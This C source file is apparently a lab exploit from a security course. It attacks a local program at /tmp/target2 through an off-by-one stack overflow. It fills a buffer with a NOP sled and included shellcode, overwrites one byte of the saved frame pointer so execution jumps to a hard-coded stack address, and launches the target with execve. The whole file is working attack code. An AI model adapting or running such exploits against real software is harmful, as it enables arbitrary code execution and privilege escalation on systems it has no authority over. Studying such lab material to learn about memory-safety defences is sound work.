#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; 

  args[1] = malloc(202);
  memset(args[1], 0x90, 201);
  // null terminator
  args[1][201] = '\0';

  // copy shell code
  memcpy(args[1], shellcode, strlen(shellcode));
  
  // 4 bytes pretending to be eip address, actually shellcode address
  * (unsigned int *)(args[1] + 196) = 0xbffffce4;
  
  // altering byte, making ebp become 0xbffffda4, a part of buf
  // buf ranges from 0xbffffce4 to 0xbffffdab
  // fake ebp will be 0xbffffda4 a5 a6 a7, fake eip is 0xbfffffda8 a9 aa ab
  args[1][200] = '\xa4';

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
